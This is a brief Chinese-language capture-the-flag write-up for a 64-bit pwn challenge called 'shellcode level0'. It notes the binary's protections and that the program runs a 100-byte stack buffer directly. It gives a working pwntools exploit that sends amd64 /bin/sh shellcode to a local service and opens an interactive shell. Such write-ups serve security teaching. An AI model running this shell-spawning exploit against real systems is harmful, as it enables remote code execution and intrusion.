# shellcode level0

## 文件分析

下载`shellcode_level0`, NX off, PIE on, Canary on, RELRO full  
ghidra分析为64位程序

## 逆向

程序中直接执行rbp-0x70的地址，且给了100B的空间，填一个shellcode即可

**注意要在运行asm时加上参数`arch='amd64'`**，缺省以i386架构产生，会报错

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 33151)
shc = asm(shellcraft.amd64.sh(), arch='amd64')
sh.sendline(shc)
sh.interactive()
```

Done.
